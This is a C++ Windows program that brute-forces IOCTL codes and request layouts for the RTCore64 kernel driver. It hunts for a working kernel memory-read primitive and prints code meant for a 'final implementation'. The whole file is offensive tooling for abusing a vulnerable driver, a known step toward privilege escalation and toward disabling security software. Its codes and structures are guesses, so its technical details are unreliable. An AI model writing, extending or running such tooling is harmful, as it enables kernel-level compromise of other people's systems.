#include <Windows.h>
#include <iostream>

// All possible RTCore64 IOCTL codes to test
DWORD possibleIOCTLs[] = {
    0x80002040, 0x80002044, 0x80002048, 0x8000204C,
    0x80002050, 0x80002054, 0x80002058, 0x8000205C,
    0x80102040, 0x80102044, 0x80102048, 0x8010204C,
    0x80202040, 0x80202044, 0x80202048, 0x8020204C,
    0x9C402084, 0x9C402088, 0x9C40208C, 0x9C402090,
    0x222004,   0x222008,   0x22200C,   0x222010,
    0x222014,   0x222018,   0x22201C,   0x222020
};

#pragma pack(push, 1)
// Different possible structures
typedef struct _RTCORE_REQUEST_V1 {
    DWORD64 Address;
    DWORD64 Value;
    DWORD Size;
} RTCORE_REQUEST_V1;

typedef struct _RTCORE_REQUEST_V2 {
    DWORD64 PhysicalAddress;
    DWORD64 Value;
    DWORD Size;
    DWORD Unused1;
    DWORD Unused2;
    DWORD Unused3;
} RTCORE_REQUEST_V2;

typedef struct _RTCORE_REQUEST_V3 {
    DWORD64 Address;
    DWORD Size;
    DWORD64 Buffer;
} RTCORE_REQUEST_V3;

typedef struct _RTCORE_REQUEST_V4 {
    DWORD Size;
    DWORD64 Address;
    DWORD64 Value;
} RTCORE_REQUEST_V4;
#pragma pack(pop)

class RTCore64IOCTLBruteForcer {
private:
    HANDLE hDriver = INVALID_HANDLE_VALUE;
    
public:
    bool Initialize() {
        printf("╔════════════════════════════════════════════════════════════════╗\n");
        printf("║              RTCore64 IOCTL BRUTE FORCE TESTER                ║\n");
        printf("║         Finding the correct IOCTL codes and structures        ║\n");
        printf("╚════════════════════════════════════════════════════════════════╝\n\n");
        
        hDriver = CreateFileW(L"\\\\.\\RTCore64",
                             GENERIC_READ | GENERIC_WRITE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL,
                             OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL,
                             NULL);
                             
        if (hDriver == INVALID_HANDLE_VALUE) {
            printf("❌ Failed to connect to RTCore64\n");
            return false;
        }
        
        printf("✅ Connected to RTCore64 successfully!\n");
        return true;
    }
    
    void BruteForceIOCTLs() {
        printf("\n🔍 BRUTE FORCING IOCTL CODES...\n");
        printf("Testing %d possible IOCTL codes\n", sizeof(possibleIOCTLs)/sizeof(DWORD));
        
        DWORD64 testAddr = 0x1000; // Safe test address
        
        for (int i = 0; i < sizeof(possibleIOCTLs)/sizeof(DWORD); i++) {
            DWORD ioctl = possibleIOCTLs[i];
            printf("\n[%d/%d] Testing IOCTL: 0x%08X\n", i+1, sizeof(possibleIOCTLs)/sizeof(DWORD), ioctl);
            
            // Test with different structures
            if (TestStructureV1(ioctl, testAddr)) {
                printf("🎯 SUCCESS! IOCTL 0x%08X works with Structure V1!\n", ioctl);
                TestReadWrites(ioctl, 1);
            }
            
            if (TestStructureV2(ioctl, testAddr)) {
                printf("🎯 SUCCESS! IOCTL 0x%08X works with Structure V2!\n", ioctl);
                TestReadWrites(ioctl, 2);
            }
            
            if (TestStructureV3(ioctl, testAddr)) {
                printf("🎯 SUCCESS! IOCTL 0x%08X works with Structure V3!\n", ioctl);
                TestReadWrites(ioctl, 3);
            }
            
            if (TestStructureV4(ioctl, testAddr)) {
                printf("🎯 SUCCESS! IOCTL 0x%08X works with Structure V4!\n", ioctl);
                TestReadWrites(ioctl, 4);
            }
        }
    }
    
    bool TestStructureV1(DWORD ioctl, DWORD64 address) {
        RTCORE_REQUEST_V1 request = {0};
        request.Address = address;
        request.Size = 4;
        
        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(hDriver,
                                     ioctl,
                                     &request,
                                     sizeof(request),
                                     &request,
                                     sizeof(request),
                                     &bytesReturned,
                                     NULL);
        
        return result && bytesReturned > 0 && request.Value != 0;
    }
    
    bool TestStructureV2(DWORD ioctl, DWORD64 address) {
        RTCORE_REQUEST_V2 request = {0};
        request.PhysicalAddress = address;
        request.Size = 4;
        
        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(hDriver,
                                     ioctl,
                                     &request,
                                     sizeof(request),
                                     &request,
                                     sizeof(request),
                                     &bytesReturned,
                                     NULL);
        
        return result && bytesReturned > 0 && request.Value != 0;
    }
    
    bool TestStructureV3(DWORD ioctl, DWORD64 address) {
        RTCORE_REQUEST_V3 request = {0};
        request.Address = address;
        request.Size = 4;
        
        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(hDriver,
                                     ioctl,
                                     &request,
                                     sizeof(request),
                                     &request,
                                     sizeof(request),
                                     &bytesReturned,
                                     NULL);
        
        return result && bytesReturned > 0 && request.Buffer != 0;
    }
    
    bool TestStructureV4(DWORD ioctl, DWORD64 address) {
        RTCORE_REQUEST_V4 request = {0};
        request.Address = address;
        request.Size = 4;
        
        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(hDriver,
                                     ioctl,
                                     &request,
                                     sizeof(request),
                                     &request,
                                     sizeof(request),
                                     &bytesReturned,
                                     NULL);
        
        return result && bytesReturned > 0 && request.Value != 0;
    }
    
    void TestReadWrites(DWORD ioctl, int structureType) {
        printf("\n🧪 EXTENDED TESTING for IOCTL 0x%08X (Structure V%d)\n", ioctl, structureType);
        
        // Test multiple addresses
        DWORD64 testAddresses[] = {
            0x1000, 0x2000, 0x3000, 0x4000, 0x5000,
            0x10000, 0x20000, 0x30000, 0x100000
        };
        
        for (int i = 0; i < sizeof(testAddresses)/sizeof(DWORD64); i++) {
            DWORD64 addr = testAddresses[i];
            DWORD value = ReadMemoryWithIOCTL(ioctl, structureType, addr);
            
            if (value != 0) {
                printf("[+] Address 0x%llX: 0x%08X ✅\n", addr, value);
                
                // If we found a working read, this is THE correct IOCTL!
                printf("\n🎉🎉🎉 JACKPOT! 🎉🎉🎉\n");
                printf("WORKING IOCTL: 0x%08X\n", ioctl);
                printf("STRUCTURE TYPE: V%d\n", structureType);
                printf("TEST ADDRESS: 0x%llX\n", addr);
                printf("READ VALUE: 0x%08X\n", value);
                
                // Generate final code
                GenerateFinalCode(ioctl, structureType);
                return;
            }
        }
    }
    
    DWORD ReadMemoryWithIOCTL(DWORD ioctl, int structureType, DWORD64 address) {
        DWORD bytesReturned = 0;
        BOOL result = FALSE;
        
        switch (structureType) {
            case 1: {
                RTCORE_REQUEST_V1 request = {0};
                request.Address = address;
                request.Size = 4;
                result = DeviceIoControl(hDriver, ioctl, &request, sizeof(request), 
                                       &request, sizeof(request), &bytesReturned, NULL);
                return result ? (DWORD)request.Value : 0;
            }
            case 2: {
                RTCORE_REQUEST_V2 request = {0};
                request.PhysicalAddress = address;
                request.Size = 4;
                result = DeviceIoControl(hDriver, ioctl, &request, sizeof(request), 
                                       &request, sizeof(request), &bytesReturned, NULL);
                return result ? (DWORD)request.Value : 0;
            }
            case 3: {
                RTCORE_REQUEST_V3 request = {0};
                request.Address = address;
                request.Size = 4;
                result = DeviceIoControl(hDriver, ioctl, &request, sizeof(request), 
                                       &request, sizeof(request), &bytesReturned, NULL);
                return result ? (DWORD)request.Buffer : 0;
            }
            case 4: {
                RTCORE_REQUEST_V4 request = {0};
                request.Address = address;
                request.Size = 4;
                result = DeviceIoControl(hDriver, ioctl, &request, sizeof(request), 
                                       &request, sizeof(request), &bytesReturned, NULL);
                return result ? (DWORD)request.Value : 0;
            }
        }
        return 0;
    }
    
    void GenerateFinalCode(DWORD workingIOCTL, int structureType) {
        printf("\n╔════════════════════════════════════════════════════════════════╗\n");
        printf("║                    FINAL WORKING CODE                          ║\n");
        printf("╚════════════════════════════════════════════════════════════════╝\n");
        
        printf("\n// WORKING RTCore64 CONFIGURATION:\n");
        printf("#define RTCORE64_MEMORY_READ    0x%08X\n", workingIOCTL);
        printf("\n");
        
        switch (structureType) {
            case 1:
                printf("typedef struct _RTCORE_REQUEST {\n");
                printf("    DWORD64 Address;\n");
                printf("    DWORD64 Value;\n");
                printf("    DWORD Size;\n");
                printf("} RTCORE_REQUEST;\n");
                break;
            case 2:
                printf("typedef struct _RTCORE_REQUEST {\n");
                printf("    DWORD64 PhysicalAddress;\n");
                printf("    DWORD64 Value;\n");
                printf("    DWORD Size;\n");
                printf("    DWORD Unused1;\n");
                printf("    DWORD Unused2;\n");
                printf("    DWORD Unused3;\n");
                printf("} RTCORE_REQUEST;\n");
                break;
            case 3:
                printf("typedef struct _RTCORE_REQUEST {\n");
                printf("    DWORD64 Address;\n");
                printf("    DWORD Size;\n");
                printf("    DWORD64 Buffer;\n");
                printf("} RTCORE_REQUEST;\n");
                break;
            case 4:
                printf("typedef struct _RTCORE_REQUEST {\n");
                printf("    DWORD Size;\n");
                printf("    DWORD64 Address;\n");
                printf("    DWORD64 Value;\n");
                printf("} RTCORE_REQUEST;\n");
                break;
        }
        
        printf("\n🎯 USE THESE VALUES IN YOUR FINAL IMPLEMENTATION!\n");
    }
    
    ~RTCore64IOCTLBruteForcer() {
        if (hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(hDriver);
        }
    }
};

int main() {
    printf("This will systematically test ALL possible RTCore64 IOCTL codes!\n");
    printf("Since connection works, we just need to find the right codes.\n\n");
    
    RTCore64IOCTLBruteForcer tester;
    
    if (!tester.Initialize()) {
        printf("Failed to initialize RTCore64 connection\n");
        system("pause");
        return 1;
    }
    
    tester.BruteForceIOCTLs();
    
    printf("\n╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                    BRUTE FORCE COMPLETE                       ║\n");
    printf("║      If successful, use the generated code above!             ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    
    system("pause");
    return 0;
} 